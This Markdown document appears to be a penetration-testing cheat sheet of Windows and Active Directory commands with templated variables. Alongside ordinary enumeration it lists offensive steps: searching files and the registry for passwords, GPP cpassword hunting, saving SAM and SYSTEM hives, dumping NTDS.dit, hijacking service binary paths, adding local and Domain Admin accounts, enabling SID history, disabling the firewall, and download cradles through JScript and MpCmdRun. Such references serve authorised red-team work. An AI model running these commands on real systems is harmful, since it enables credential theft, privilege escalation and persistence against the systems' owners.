# Windows

## system

### System info

Print full Windows system information.

```cmd title:"Print Windows systeminfo"
systeminfo
```
<!-- cheat -->

### Hostname

Print hostname.

```cmd title:"Windows Print hostname"
hostname
```
<!-- cheat -->

### Computer name

Print computer name from PowerShell.

```powershell title:"Windows Print computer name"
$env:COMPUTERNAME
```
<!-- cheat -->

## files

### Find password strings

Search common document types for password strings.

```cmd title:"Windows Search files for password strings"
findstr /si "password" *.txt *.xml *.docx
```
<!-- cheat -->

### GPP cpassword

Search SYSVOL policies for Group Policy Preferences cpassword values.

```cmd title:"Windows Search SYSVOL for cpassword"
findstr /S /I cpassword "\\$domain\sysvol\$domain\policies\*.xml"
```
<!-- cheat
var domain
-->

### Recycle Bin

Recursively list Recycle Bin contents.

```cmd title:"Windows List Recycle Bin contents"
dir C:\$Recycle.Bin /s /b
```
<!-- cheat -->

### Hidden files

List hidden files in a path.

```cmd title:"Windows List hidden files"
dir /a:h "$path"
```
<!-- cheat
var path
-->

### Recursive list

Recursively list files by full path.

```cmd title:"Windows Recursively list files"
dir /s /b
```
<!-- cheat -->

### Hosts file

Print the Windows hosts file.

```cmd title:"Print Windows hosts file"
type C:\WINDOWS\System32\drivers\etc\hosts
```
<!-- cheat -->

## process and services

### Scheduled tasks

List scheduled tasks verbosely.

```cmd title:"Windows List scheduled tasks"
schtasks /query /fo LIST /v
```
<!-- cheat -->

### Find scheduled task

Find a scheduled task by name.

```cmd title:"Windows Find scheduled task by name"
schtasks /query /fo LIST 2>nul | findstr "$task_name"
```
<!-- cheat
var task_name
-->

### Processes

List processes verbosely.

```cmd title:"Windows List processes verbosely"
tasklist /V
```
<!-- cheat -->

### Processes with services

List processes and linked services.

```cmd title:"Windows List processes and linked services"
tasklist /SVC
```
<!-- cheat -->

### Service permissions

Check service permissions with accesschk.

```cmd title:"Windows Check service permissions"
accesschk.exe /accepteula -ucqv "$service_name"
```
<!-- cheat
var service_name
-->

### Reconfigure service command

Set a service binary path to a command.

```cmd title:"Windows Set service binary path"
sc config "$service_name" binpath= "$command"
```
<!-- cheat
var service_name
var command
-->

### Start service

Start a service.

```cmd title:"Start Windows service"
net start "$service_name"
```
<!-- cheat
var service_name
-->

## registry

### Winlogon

Query Winlogon registry values.

```cmd title:"Windows Query Winlogon registry values"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
<!-- cheat -->

### HKLM password search

Search HKLM registry strings for password.

```cmd title:"Windows Search HKLM registry for password"
reg query HKLM /f password /t REG_SZ /s
```
<!-- cheat -->

### HKCU password search

Search HKCU registry strings for password.

```cmd title:"Windows Search HKCU registry for password"
reg query HKCU /f password /t REG_SZ /s
```
<!-- cheat -->

### Save hives

Save SAM, SECURITY, and SYSTEM hives.

```cmd title:"Windows Save SAM SECURITY SYSTEM hives"
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```
<!-- cheat -->

## users and groups

### Whoami privileges

Print current privileges.

```cmd title:"Windows Print whoami privileges"
whoami /priv
```
<!-- cheat -->

### User info

Show local user information.

```cmd title:"Windows Show local user info"
net user "$target_user"
```
<!-- cheat
var target_user
-->

### Add local user

Create a local user.

```cmd title:"Windows Create local user"
net user "$target_user" "$target_pass" /ADD
```
<!-- cheat
var target_user
var target_pass
-->

### Add local admin

Add a user to local administrators.

```cmd title:"Windows Add user to local administrators"
net localgroup administrators "$target_user" /add
```
<!-- cheat
var target_user
-->

### Runas

Run cmd as another user.

```cmd title:"Windows Run cmd as another user"
runas /user:$domain\$user cmd.exe
```
<!-- cheat
var domain
var user
-->

### Local group members

List members of a local group.

```cmd title:"Windows List local group members"
net localgroup "$group_name"
```
<!-- cheat
var group_name
-->

## domain

### Domain DNS

Query domain DNS records from `%USERDNSDOMAIN%`.

```cmd title:"Windows Query current domain DNS records"
nslookup -type=any %USERDNSDOMAIN%.
```
<!-- cheat -->

### Domain name

Print NetBIOS domain.

```cmd title:"Windows Print USERDOMAIN"
echo %USERDOMAIN%
```
<!-- cheat -->

### Domain FQDN

Print DNS domain.

```cmd title:"Windows Print USERDNSDOMAIN"
echo %USERDNSDOMAIN%
```
<!-- cheat -->

### Logon server

Print logon server.

```cmd title:"Windows Print LOGONSERVER"
echo %LOGONSERVER%
```
<!-- cheat -->

### Domain user info

Show domain user info.

```cmd title:"Windows Show domain user info"
net user "$target_user" /domain
```
<!-- cheat
var target_user
-->

### Add Domain Admin

Add a user to Domain Admins.

```cmd title:"Windows Add user to Domain Admins"
net group "Domain Admins" "$target_user" /add /domain
```
<!-- cheat
var target_user
-->

### Domain controllers

List domain controllers.

```cmd title:"Windows List domain controllers"
nltest /dclist:$domain
```
<!-- cheat
var domain
-->

### Domain trusts

List domain trust relationships.

```cmd title:"Windows List domain trusts"
nltest /domain_trusts
```
<!-- cheat -->

### Enable SID history

Enable SID history on a trust.

```cmd title:"Windows Enable SID history on trust"
netdom trust "$source_domain" /d:"$target_domain" /enablesidhistory:yes
```
<!-- cheat
var source_domain
var target_domain
-->

## network

### ARP cache

Print ARP cache.

```cmd title:"Windows Print ARP cache"
arp -a
```
<!-- cheat -->

### Domain shares

List domain shares.

```cmd title:"Windows List domain shares"
net view /all /domain "$domain"
```
<!-- cheat
var domain
-->

### Host shares

List shares on a host.

```cmd title:"Windows List shares on host"
net view "\\$rhost_name" /ALL
```
<!-- cheat
var rhost_name
-->

### Mount share

Mount an SMB share to `x:`.

```cmd title:"Windows Mount SMB share to drive x"
net use x: "\\$rhost_name\$share"
```
<!-- cheat
var rhost_name
var share
-->

## firewall

### Firewall state

Show firewall state.

```cmd title:"Windows Show firewall state"
netsh advfirewall show allprofiles
```
<!-- cheat -->

### Firewall off

Disable Windows Firewall for all profiles.

```cmd title:"Disable Windows Firewall"
netsh advfirewall set allprofiles state off
```
<!-- cheat -->

### Firewall on

Enable Windows Firewall for all profiles.

```cmd title:"Enable Windows Firewall"
netsh advfirewall set allprofiles state on
```
<!-- cheat -->

### Open RDP

Open RDP on the firewall.

```cmd title:"Windows Open RDP firewall rule"
netsh firewall add portopening TCP 3389 "Remote Desktop"
```
<!-- cheat -->

## shadow copy and ntds

### Create shadow copy

Create a shadow copy for `C:`.

```cmd title:"Windows Create C drive shadow copy"
wmic shadowcopy call create Volume='C:\'
```
<!-- cheat -->

### List shadow copies

List volume shadow copies.

```cmd title:"Windows List volume shadow copies"
vssadmin list shadows
```
<!-- cheat -->

### IFM NTDS dump

Create an IFM copy of AD DS.

```cmd title:"Windows Create IFM NTDS dump"
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
<!-- cheat -->

### Copy NTDS with VSS

Copy `ntds.dit` via VSS.

```cmd title:"Windows Copy ntds.dit with VSS"
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
<!-- cheat -->

## transfer

### JScript download

Download a file with WinHttpRequest through cscript.

```cmd title:"Windows Download file with JScript WinHttpRequest"
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js "$url" > "$output_file"
```
<!-- cheat
var url
var output_file
-->

### Defender download

Download a file with MpCmdRun.

```cmd title:"Windows Download file with MpCmdRun"
mpcmdrun.exe -DownloadFile -url "$url" -path "$output_file"
```
<!-- cheat
var url
var output_file
-->
